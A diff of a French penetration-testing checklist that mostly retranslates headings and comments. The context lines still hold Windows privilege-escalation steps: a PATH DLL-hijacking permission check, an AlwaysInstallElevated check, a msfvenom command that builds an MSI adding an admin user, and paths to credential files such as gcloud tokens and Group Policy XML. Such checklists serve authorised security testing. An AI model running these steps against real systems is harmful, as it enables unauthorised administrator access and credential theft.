@@ -8,7 +8,7 @@ description: "Organiser les vérifications et la collecte des résultats."
 Organiser les vérifications et la collecte des résultats.
 
 
-### Numérisation initiale
+### Scan initial
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -189,7 +189,7 @@ pwd
 Examiner les entrées et les réponses de l'application web.
 
 
-### Numérisation initiale
+### Scan initial
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -256,7 +256,7 @@ Examiner les entrées et les réponses de l'application web.
 `master.key` · `root:` · `root:password` · `/manager`  
 
 
-### Tester les fonctions de téléversement
+### Tester le téléversement de fichiers (File Upload)
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -787,8 +787,8 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 
 
 ```powershell
-# PATH DLL Hijacking
-# having write permissions inside a folder present ON PATH could bring to DLL hijacking
+# Détournement du chargement de DLL via PATH (DLL Hijacking)
+# Un dossier modifiable présent dans PATH peut permettre un détournement de DLL
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\ everyone authenticated users todos %username%" && echo. )
 
 ```
@@ -798,14 +798,14 @@ for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F
 
 ```powershell
 # si les deux sont activés (réglage à 0x1), il est possible d'exécuter
-# any .msi as NT AUTHORITY\SYSTEM
+# Un fichier .msi peut alors s’exécuter avec les privilèges NT AUTHORITY\SYSTEM
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 # vérifier avec msf
 exploit/windows/local/always_install_elevated
 
-# generate payload with msfvenom
+# Générer une charge utile (payload) avec msfvenom
 # pas de format uac
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
 # en utilisant le msiexec l'uac ne sera pas invité
@@ -1103,11 +1103,11 @@ AppData\Roaming\gcloud\access_tokens.db
 
 
 ```powershell
-# Avant que Vista regarde à l'intérieur
+# Avant Windows Vista, rechercher dans ce répertoire
 C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
-# Après Vista regarder à l'intérieur
+# Depuis Windows Vista, rechercher dans ce répertoire
 C:\ProgramData\Microsoft\Group Policy\history
-# Look for
+# Rechercher ces fichiers
 Groups.xml
 Services.xml
 Scheduledtasks.xml
